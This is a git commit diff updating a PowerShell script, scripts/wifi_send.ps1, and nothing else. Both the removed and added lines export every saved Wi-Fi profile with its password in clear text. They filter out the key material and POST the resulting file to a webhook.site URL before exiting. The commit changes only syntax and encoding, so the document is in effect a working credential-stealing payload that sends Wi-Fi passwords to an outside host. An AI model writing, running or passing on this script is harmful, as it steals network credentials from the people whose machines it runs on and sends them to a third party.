2e1d516a233e9e9cc1863279c5649f2a8a0767a3
Matik <mateusz.kisiel.mk@gmail.com>
2022-02-16 21:49:01 +0100

    updated wifi_send script 2

--- scripts/wifi_send.ps1
+++ scripts/wifi_send.ps1
@@ -1,1 +1,1 @@
-cd %temp%; netsh wlan export profile key=clear; powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS ; powershell Invoke-WebRequest -Uri https://webhook.site/b4551bf8-8100-4ab7-9dfa-40276a3e01e2/wifi -Method POST -InFile Wi-Fi-PASS ; exit
+cd $env:temp; netsh wlan export profile key=clear; Select-String -Path Wi*.xml -Pattern 'keyMaterial' -Encoding utf8 | Out-File -Encoding utf8 -FilePath Wi-Fi-PASS ; Invoke-WebRequest -Uri https://webhook.site/b4551bf8-8100-4ab7-9dfa-40276a3e01e2/wifi -Method POST -InFile Wi-Fi-PASS ; exit
